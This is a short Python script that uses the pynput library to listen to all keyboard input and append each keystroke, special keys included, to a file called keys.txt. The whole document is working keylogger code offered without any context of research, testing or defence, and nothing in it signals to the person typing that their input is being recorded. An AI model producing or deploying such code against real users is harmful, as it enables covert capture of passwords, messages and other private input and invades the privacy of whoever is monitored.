# pip install pynput

from pynput import keyboard

def on_press(key):
    try:
        with open("keys.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keys.txt", "a") as f:
            f.write("[" + str(key) + "]")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()

